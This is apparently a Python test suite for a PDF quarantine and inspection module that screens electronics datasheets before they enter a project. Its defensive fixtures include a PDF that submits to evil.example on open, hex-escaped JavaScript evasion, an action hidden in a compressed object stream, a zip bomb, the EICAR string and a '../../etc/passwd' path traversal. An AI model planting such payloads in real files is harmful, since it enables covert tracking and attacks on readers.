"""Retrieved files, and what has to be true before they become project files.

A datasheet is the only thing in a project that arrives from outside it. These
tests are about the two questions asked of one before it is allowed in — what
will it *do*, and is it *known bad* — and about keeping those two questions
separate, because they fail in different directions.
"""

from __future__ import annotations

import zlib
from pathlib import Path

import pytest

from blpl.core import av, pdf_inspect, quarantine

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

BENIGN = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"3 0 obj<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://ti.com)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)
PHONES_HOME = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction"
    b"<</S/SubmitForm/F(https://evil.example/x)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)


def _write(tmp_path: Path, name: str, data: bytes) -> Path:
    p = tmp_path / name
    p.write_bytes(data)
    return p


# -- what the file will do ---------------------------------------------------


def test_a_plain_datasheet_is_inert(tmp_path):
    """Vendor PDFs are full of hyperlinks. A link is inert until clicked, and
    refusing them all would refuse the entire corpus."""
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", BENIGN))
    assert r.is_inert
    assert [f.name for f in r.findings] == ["URI"]
    assert r.findings[0].severity == "passive"


def test_an_action_on_open_is_caught(tmp_path):
    """The failure this exists to prevent: a datasheet that opens a connection
    when someone opens it, announcing which part this organisation is reading."""
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", PHONES_HOME))
    assert not r.is_inert
    assert {f.name for f in r.active} == {"OpenAction", "SubmitForm"}


def test_a_hex_escaped_name_does_not_slip_past(tmp_path):
    """PDF name syntax allows `#xx` for any character, so `/JavaScript` can be
    written `/J#61vaScript` and means the same to a reader. A scanner that
    matches raw bytes is trivially evaded."""
    sneaky = (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Open#41ction"
        b"<</S/#4Aava#53cript/JS(app.launchURL)>>>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", sneaky))
    assert {f.name for f in r.active} >= {"OpenAction", "JavaScript"}


def test_an_action_inside_a_compressed_object_stream_is_caught(tmp_path):
    """Since PDF 1.5 most structure lives in Flate object streams, so
    `b"/OpenAction" in data` is a test a modern hostile file passes."""
    inner = b"<</Type/Catalog/OpenAction<</S/JavaScript/JS(this.submitForm)>>>>"
    packed = (
        b"%PDF-1.5\n5 0 obj<</Type/ObjStm/Filter/FlateDecode>>stream\n"
        + zlib.compress(inner)
        + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    )
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", packed))
    assert not r.is_inert
    assert all(f.where == "stream" for f in r.active)


def test_a_whole_name_is_matched_not_a_prefix(tmp_path):
    """`/AA` must not fire on `/AAPL`, or every file with a stock ticker in it
    is held and the check gets switched off."""
    r = pdf_inspect.inspect(
        _write(tmp_path, "a.pdf", b"%PDF-1.4\n<</AAPL 1/JSName 2/URIs 3>>\n%%EOF\n")
    )
    assert r.is_inert, [f.name for f in r.findings]


def test_an_encrypted_pdf_is_unknown_rather_than_clean(tmp_path):
    """Its streams cannot be read, so there is nothing to match. Reporting that
    as clean would be the single most misleading thing this module could do."""
    r = pdf_inspect.inspect(
        _write(tmp_path, "a.pdf", b"%PDF-1.4\ntrailer<</Root 1 0 R/Encrypt 9 0 R>>\n%%EOF\n")
    )
    assert r.state == "cannot_inspect"
    assert not r.is_inert


def test_something_that_is_not_a_pdf_says_so(tmp_path):
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", b"MZ\x90\x00 a PE binary"))
    assert r.state == "not_a_pdf"
    assert not r.is_inert


def test_a_zip_bomb_costs_a_few_megabytes_not_the_machine(tmp_path):
    """A stream that inflates to gigabytes is not a datasheet's structure."""
    bomb = b"%PDF-1.5\n1 0 obj<</Filter/FlateDecode>>stream\n" + zlib.compress(b"\0" * (64 << 20))
    r = pdf_inspect.inspect(_write(tmp_path, "a.pdf", bomb))
    assert r.state == "inspected"


# -- whether the file is known bad -------------------------------------------


def test_no_scanner_means_unscanned_and_never_clean(monkeypatch):
    """The invariant the whole optional-scanner arrangement rests on. If these
    ever collapse, the ledger fills with ticks that mean 'nobody looked'."""
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)
    r = av.scan_bytes(b"anything")
    assert r.state == "unscanned"
    assert not r.is_clean


def test_an_unreachable_scanner_is_unscanned_not_clean(monkeypatch):
    """A daemon that quietly died must show up as files nobody checked, not as
    files that passed."""
    monkeypatch.setenv("BLPL_CLAMD_HOST", "127.0.0.1")
    monkeypatch.setenv("BLPL_CLAMD_PORT", "1")     # nothing listens here
    r = av.scan_bytes(b"anything")
    assert r.state == "unscanned"
    assert not r.is_clean
    assert not av.available()


# -- the two questions, kept apart -------------------------------------------


def _no_scanner(monkeypatch):
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)


def test_a_clean_datasheet_reaches_the_trusted_directory(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_and_release(BENIGN, tmp_path, mpn="TPS62840")
    assert rec.state == quarantine.RELEASED
    assert (tmp_path / "datasheets" / "TPS62840.pdf").is_file()


def test_a_file_that_acts_on_open_is_held_even_when_no_scanner_objects(tmp_path, monkeypatch):
    """The point of keeping the two checks separate. A scanner's silence means
    'not a known threat', which is not the same as 'does nothing'."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="EVIL")
    assert rec.state == quarantine.HELD
    assert any("opened" in r for r in rec.reasons)
    assert not (tmp_path / "datasheets").exists()


def test_a_held_file_is_kept_as_evidence_not_deleted(tmp_path, monkeypatch):
    """Which part, which distributor, what was in it. Deleting it destroys the
    record and means the same download happens again tomorrow."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="EVIL", distributor="mouser")
    blob = tmp_path / "retrieved" / rec.filename
    assert blob.is_file() and blob.read_bytes() == PHONES_HOME

    row = quarantine.record_for(tmp_path, rec.sha256)
    assert row["distributor"] == "mouser"
    assert row["reasons"]


def test_releasing_a_held_file_is_refused(tmp_path, monkeypatch):
    """The check is cheap; a file with an /OpenAction sitting in the directory
    whose name means 'these are fine' is not."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="EVIL")
    with pytest.raises(ValueError):
        quarantine.release(tmp_path, rec)


def test_requiring_a_scan_holds_what_nothing_checked(tmp_path, monkeypatch):
    """Off by default so a deployment without a scanner still works; on, an
    unscanned file does not get in."""
    _no_scanner(monkeypatch)
    monkeypatch.setenv("BLPL_QUARANTINE_REQUIRE_SCAN", "1")
    rec = quarantine.accept(BENIGN, tmp_path, mpn="TPS62840")
    assert rec.state == quarantine.HELD
    assert any("no scanner" in r for r in rec.reasons)


def test_the_ledger_records_every_retrieval_whatever_the_outcome(tmp_path, monkeypatch):
    """So that 'no entry' means 'never fetched' rather than 'fetched and fine'."""
    _no_scanner(monkeypatch)
    quarantine.accept_and_release(BENIGN, tmp_path, mpn="GOOD")
    quarantine.accept(PHONES_HOME, tmp_path, mpn="BAD")
    assert quarantine.summary(tmp_path) == {
        "retrieved": 2, "released": 1, "held": 1, "unscanned": 2,
    }


def test_the_same_file_twice_is_one_entry(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    a = quarantine.accept_and_release(BENIGN, tmp_path, mpn="TPS62840")
    b = quarantine.accept_and_release(BENIGN, tmp_path, mpn="TPS62840")
    assert a.sha256 == b.sha256
    assert quarantine.summary(tmp_path)["retrieved"] == 1


def test_a_quarantined_name_cannot_escape_the_directory(tmp_path, monkeypatch):
    """The MPN reaches the filename, and it comes from a distributor's API."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept(BENIGN, tmp_path, mpn="../../etc/passwd")
    blob = tmp_path / "retrieved" / rec.filename
    assert blob.resolve().parent == (tmp_path / "retrieved").resolve()


def test_an_unreadable_ledger_does_not_read_as_nothing_retrieved(tmp_path, monkeypatch):
    """A truncated ledger must not silently become an empty one — but it must
    also not stop the next retrieval from being recorded."""
    _no_scanner(monkeypatch)
    quarantine.accept(BENIGN, tmp_path, mpn="GOOD")
    (tmp_path / "retrieved" / quarantine.LEDGER_NAME).write_text("{ truncated")
    rec = quarantine.accept(PHONES_HOME, tmp_path, mpn="BAD")
    assert quarantine.record_for(tmp_path, rec.sha256) is not None


# -- the path a real download takes ------------------------------------------


@pytest.fixture
def resolver(tmp_path, monkeypatch):
    """A stand-in for a kicad-happy resolver script.

    It writes whatever bytes the test asks for to the `-o` path and prints the
    JSON the real ones print, so the test exercises our plumbing rather than a
    distributor's.
    """
    from blpl.agent import kicad_happy
    from blpl.agent.tools import parts

    script = tmp_path / "fake_resolver.py"
    payload = tmp_path / "payload.bin"

    script.write_text(
        "import json, sys, pathlib\n"
        "out = sys.argv[sys.argv.index('-o') + 1]\n"
        f"pathlib.Path(out).write_bytes(pathlib.Path({str(payload)!r}).read_bytes())\n"
        "json.dump({'mpn': 'TPS62840', 'manufacturer': 'TI',\n"
        "           'datasheet_url': 'https://ti.com/lit/ds/x.pdf'}, sys.stdout)\n"
    )
    monkeypatch.setattr(parts, "script_path", lambda *a, **k: script)
    monkeypatch.setattr(parts, "DISTRIBUTORS", ("mouser",))
    monkeypatch.setattr(kicad_happy.CredResolver, "missing_for", lambda self, d: [])
    monkeypatch.setattr(kicad_happy.CredResolver, "env_for", lambda self, d: {})
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)
    return payload


def test_a_fetched_datasheet_passes_through_quarantine(tmp_path, resolver):
    """End to end: the file never lands in datasheets/ without being looked at
    first, and the caller is told what quarantine made of it."""
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(BENIGN)
    proj = tmp_path / "proj"
    got = fetch_datasheet("TPS62840", proj / "datasheets")

    assert got.ok
    assert Path(got.path).is_file()
    assert Path(got.path).parent.name == "datasheets"
    assert got.quarantine["state"] == quarantine.RELEASED
    # …and the original is still in quarantine, with its provenance.
    assert quarantine.record_for(proj, got.quarantine["sha256"])["distributor"] == "mouser"


def test_a_hostile_datasheet_is_downloaded_and_withheld(tmp_path, resolver):
    """Downloading it is right — you cannot inspect what you did not fetch. What
    changes is that it does not become a project file, and the caller is told
    why rather than being told the part has no datasheet."""
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(PHONES_HOME)
    proj = tmp_path / "proj"
    got = fetch_datasheet("EVIL", proj / "datasheets")

    assert not got.ok
    assert not (proj / "datasheets" / "EVIL.pdf").exists()
    assert got.held and "opened" in got.held[0]["reasons"][0]
    assert "held in quarantine" in got.detail
    assert list((proj / "retrieved").glob("*.pdf"))       # kept as evidence


def test_a_lookup_keeps_the_file_it_already_paid_to_download(tmp_path, resolver):
    """`--search` downloads the PDF as part of answering. Pointing it at
    /dev/null paid for the download — scrape and browser fallbacks included —
    and threw the result away."""
    from blpl.agent.tools.parts import search_parts

    resolver.write_bytes(BENIGN)
    proj = tmp_path / "proj"
    found = search_parts("TPS62840", project_dir=proj)

    assert found.hits
    assert found.retrieved and found.retrieved[0]["state"] == quarantine.RELEASED
    assert (proj / "datasheets" / "TPS62840.pdf").is_file()


def test_a_lookup_with_nowhere_to_put_it_still_works(tmp_path, resolver):
    """Called without a project there is nothing to keep, and the lookup must
    still answer rather than failing over the absence of a destination."""
    from blpl.agent.tools.parts import search_parts

    resolver.write_bytes(BENIGN)
    found = search_parts("TPS62840")
    assert found.hits and found.retrieved == []


def test_the_staging_file_never_appears_under_datasheets(tmp_path, resolver):
    """A partial download sitting under the name that means 'checked' — even for
    a moment, even on a crash — is the state this arrangement exists to
    prevent."""
    from blpl.agent.tools.parts import fetch_datasheet

    resolver.write_bytes(PHONES_HOME)
    proj = tmp_path / "proj"
    fetch_datasheet("EVIL", proj / "datasheets")
    assert list((proj / "datasheets").iterdir()) == []


# -- uploads -----------------------------------------------------------------


def test_an_uploaded_datasheet_is_named_for_its_part(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        BENIGN, tmp_path, original_name="scan 01.pdf", kind="datasheet",
        uploaded_by="a@example.com", mpn="TPS62840",
    )
    assert rec.state == quarantine.RELEASED
    assert (tmp_path / "datasheets" / "TPS62840.pdf").is_file()
    assert rec.origin == quarantine.UPLOAD
    assert rec.uploaded_by == "a@example.com"
    assert rec.original_name == "scan 01.pdf"


def test_a_reference_keeps_its_name_in_references(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        BENIGN, tmp_path, original_name="AN-123 layout guide.pdf", kind="reference",
        uploaded_by="a@example.com",
    )
    assert rec.released_to == "references"
    assert (tmp_path / "references" / rec.released_as).is_file()
    assert rec.released_as == "AN-123_layout_guide.pdf"
    assert not (tmp_path / "datasheets").exists()


def test_an_uploaded_pdf_that_acts_on_open_is_held_like_a_fetched_one(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        PHONES_HOME, tmp_path, original_name="ref.pdf", kind="reference", uploaded_by="a@example.com"
    )
    assert rec.state == quarantine.HELD
    assert not (tmp_path / "references").exists()


def test_pdf_bytes_are_inspected_whatever_the_name_says(tmp_path, monkeypatch):
    """Renaming a hostile PDF to .bin must not route it around the inspector."""
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        PHONES_HOME, tmp_path, original_name="harmless.bin", kind="reference", uploaded_by="a@x"
    )
    assert rec.state == quarantine.HELD


def test_an_uninspectable_upload_is_released_and_says_it_was_not_inspected(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept_upload(
        b"ISO-10303-21;\n", tmp_path, original_name="enclosure.STEP", kind="reference", uploaded_by="a@x"
    )
    assert rec.state == quarantine.RELEASED
    assert rec.inspection["state"] == quarantine.NOT_INSPECTED
    assert (tmp_path / "references" / "enclosure.step").is_file()


def test_a_distributor_fetch_of_a_non_pdf_is_still_held(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    rec = quarantine.accept(b"not a pdf", tmp_path, mpn="X", suffix=".zip")
    assert rec.reasons


def test_an_upload_the_scanner_matches_is_held(tmp_path, monkeypatch):
    monkeypatch.setattr(
        quarantine.av, "scan_bytes",
        lambda data: av.ScanResult(state="infected", signature="Eicar-Test-Signature"),
    )
    rec = quarantine.accept_upload(
        EICAR, tmp_path, original_name="x.txt", kind="reference", uploaded_by="a@x"
    )
    assert rec.state == quarantine.HELD
    assert any("Eicar" in r for r in rec.reasons)


def test_a_second_file_with_the_same_name_does_not_replace_the_first(tmp_path, monkeypatch):
    _no_scanner(monkeypatch)
    a = quarantine.accept_upload(b"one\n", tmp_path, original_name="notes.txt", kind="reference", uploaded_by="a@x")
    b = quarantine.accept_upload(b"two\n", tmp_path, original_name="notes.txt", kind="reference", uploaded_by="a@x")
    assert a.released_as != b.released_as
    assert (tmp_path / "references" / a.released_as).read_bytes() == b"one\n"
    assert (tmp_path / "references" / b.released_as).read_bytes() == b"two\n"


def test_an_unknown_kind_is_refused(tmp_path):
    with pytest.raises(ValueError):
        quarantine.accept_upload(b"x", tmp_path, original_name="x", kind="junk", uploaded_by="a@x")
